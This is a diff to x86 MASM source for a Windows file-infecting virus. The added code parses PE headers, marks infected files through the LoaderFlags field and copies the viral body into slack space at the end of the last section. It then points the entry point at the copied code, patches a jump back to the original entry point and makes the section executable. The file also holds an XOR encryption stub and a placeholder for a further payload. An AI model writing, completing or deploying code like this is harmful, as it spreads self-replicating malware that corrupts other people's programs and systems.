@@ -160,10 +160,12 @@ startgen:
 	mov eax, 044h ; crypt_key
 	stosd
 
-	.WHILE __ValueReg == __CrptBegReg
-		invoke getrandomnumber, 04h
-		mov byte ptr [__CrptBegReg], al
-	.ENDW
+
+;
+;	.while __ValueReg ;== __CrptBegReg ; can't let you do that starfox, one of those has to be a register
+;		invoke getrandomnumber, 04h
+;		mov byte ptr [__CrptBegReg], al
+;	.endw
 
 
 
@@ -387,12 +389,15 @@ blah:pop eax
 testproc endp
 
 
-filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword
+filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword, codeSize:dword
 	local findFileData:WIN32_FIND_DATA
 	local searchHandle:dword
 	local fileHandle:dword
 	local fileMapping:dword
 	local fileView:dword
+	local originalEntryPoint:dword
+	local newSectionStart:dword
+	local virtualSectionStart:dword
 	local localdelta:dword
 
 	local prcFindFirstFile:dword
@@ -497,21 +502,141 @@ fileMainLoop:
 	cmp eax, 0
 	je fileMapClose
 	mov fileView, eax
+	; fileView now points toward an array representing our file
 
+	; SCRAT CODE
+
+	assume eax: ptr IMAGE_DOS_HEADER
+	.if [eax].e_magic != IMAGE_DOS_SIGNATURE
+		jmp fileMapViewClose
+	.endif
+	add eax, [eax].e_lfanew
+
+	assume eax: ptr IMAGE_NT_HEADERS
+	.if [eax].Signature != IMAGE_NT_SIGNATURE
+		jmp fileMapViewClose
+	.endif
+	mov ebx, eax
+	; ENDFIXME
+
+; --------------------------------------------------------------------------------------------------
+
+	; jump the PE headers (IMAGE_NT_HEADERS)
+	add eax, sizeof IMAGE_NT_HEADERS
+
+	; ebx == PE_HEADER, IMAGE_NT_HEADERS
+	; eax == IMAGE_SECTION_HEADERS
+
+	assume ebx: ptr IMAGE_NT_HEADERS
+
+	; check for loadFlags field -> infected or not?
+	.if [ebx].OptionalHeader.LoaderFlags == 46554342
+		jmp fileMapViewClose
+	.endif
+	mov [ebx].OptionalHeader.LoaderFlags, 46554342
+
+
+	; look for the last section, the last is the one with the biggest VirtualAddress
+	; FIXME : placer a la fin de .code si possible?
+	mov ecx, 0
+	mov cx, [ebx].FileHeader.NumberOfSections
+
+	assume eax: ptr IMAGE_SECTION_HEADER
+	mov esi, 0
+	.while ecx > 0
+		.if [eax].VirtualAddress > esi
+			mov esi, [eax].VirtualAddress
+			mov edi, eax
+		.endif
+		dec ecx
+		add eax, SIZEOF IMAGE_SECTION_HEADER
+	.endw
+
+	; edi == last section
+
+; --------------------------------------------------------------------------------------------------
+
+	; extend the general file size in the [ebx].FileHeader.SizeOfImage
+;	mov ecx, [ebx].OptionalHeader.SizeOfImage
+;	add ecx, 2048 + SIZEOF DWORD ; FIXME : sizeof payload + SIZEOF DWORD
+;	mov edx, [ebx].OptionalHeader.SectionAlignment
+;	memalign ecx, edx
+;	mov [ebx].OptionalHeader.SizeOfImage, ecx
+
+; --------------------------------------------------------------------------------------------------
+
+	; save the entry point of the prg
+	mov esi, [ebx].OptionalHeader.AddressOfEntryPoint
+	mov originalEntryPoint, esi
+;	add esi, [ebx].OptionalHeader.ImageBase
+
+; --------------------------------------------------------------------------------------------------
+
+	assume edi: ptr IMAGE_SECTION_HEADER
+	; preparing to write the payload
+	mov edx, fileView ; from the beginning of the mapped file
+	add edx, [edi].PointerToRawData ; go to the section address
+	add edx, [edi].SizeOfRawData ; go to the end of the section
+	dec edx ; don't go to far
+
+	; get to the right place
+	mov ecx, edx
+	.while byte ptr [edx] == 0 || byte ptr [edx] == 90h
+		dec edx
+	.endw
+	sub ecx, edx ; compute the difference
+	inc edx ; copy right after the code
+	mov newSectionStart, edx
+
+	; modifying the entry point of the prg, vadress
+	mov eax, [edi].VirtualAddress ; the vadress of the section ; FIXME : align it
+	add eax, [edi].SizeOfRawData ; the vadress of the end of the section
+	sub eax, ecx
+	mov [ebx].OptionalHeader.AddressOfEntryPoint, eax ; writing
+
+
+	push esi
+	push edi
+	push ecx
+
+	; copy the payload at the right place
+	
 	mov esi, main ;from the beginning of our code
 
-	mov edi, fileView
-	add edi, findFileData.nFileSizeLow ; to where the file originally ends
+	mov edi, newSectionStart
 
 	cld
-	mov ecx, sectionSize ; copy sectionSize bytes
+	mov ecx, codeSize ; copy sectionSize bytes
 	rep movsb ;HOLY SH1T 1TS T34L
 
-	; fileView now points toward an array representing our file
+	pop ecx
+	pop edi
+	pop esi
+
+	mov eax, newSectionStart
+	add eax, codeSize ; go to the very end of what we copied.
+	sub eax, 6 ; go back 6 bytes, which is ret and 5 nops
+	; copy the real entry point adress
+	mov byte ptr [eax], 0E9h ; E9h JMP, E8h CALL ; bug du compilo
+	inc eax
+	mov ecx, originalEntryPoint
+	mov dword ptr [eax], ecx
+	add [edi].Characteristics, IMAGE_SCN_MEM_EXECUTE
+	; increase header size
+	mov eax, sectionSize
+	add [edi].SizeOfRawData, eax
+
+	mov eax, codeSize
+	add [ebx].OptionalHeader.SizeOfImage, eax
+	add [edi].Misc.VirtualSize, eax
+
+	; END SCRAT
+	
 	; TODO : change the XOR value (label: crypt_key_value)
 	; XOR the content of fileview with the new value, between labels crypted_code_begin and crypted_code_end
 	; treatment is done !
 
+fileMapViewClose:
 	push fileView
 	call prcUnmapViewOfFile
 
@@ -550,6 +675,7 @@ beginInfection proc delta:dword
 	local hmodule:dword
 	local fileAlignment:dword
 	local sectionSize:dword
+	local codeSize:dword
 
 	jmp Kernel32Init
 
@@ -602,9 +728,10 @@ Kernel32Init:
 
 	push eax ;save eax
 
-	mov fileAlignment, 0200h ;this should be set from the header data.
+	mov fileAlignment, 01000h ;this should be set from the header data.
 	mov eax, endfile
 	sub eax, main ;we now have our total code size in eax
+	mov codeSize, eax
 	mov edx, 0
 	idiv fileAlignment ; divide it by fileAlignment
 	inc eax
@@ -613,7 +740,7 @@ Kernel32Init:
 
 	pop eax ;restore eax
 
-	invoke filesLoop, eax, procGetProcAddress, sectionSize
+	invoke filesLoop, eax, procGetProcAddress, sectionSize, codeSize
 
 	; TODO : this is were we add nasty stuff
 
@@ -645,8 +772,14 @@ start_uncrypt:
 
 	;invoke applyxorvalue, offset crypted_code_begin, offset crypted_code_end, CKV
 	jmp startinf
-
+	
 final_return:
+	; making room for the very last jmp instruction ...
+	nop ; JMP E9
+	nop ; there goes the 32 bit adress we jump to
+	nop	; sssh
+	nop	; no tears
+	nop	; only dreams now
 	ret
 endfile:
 end	main
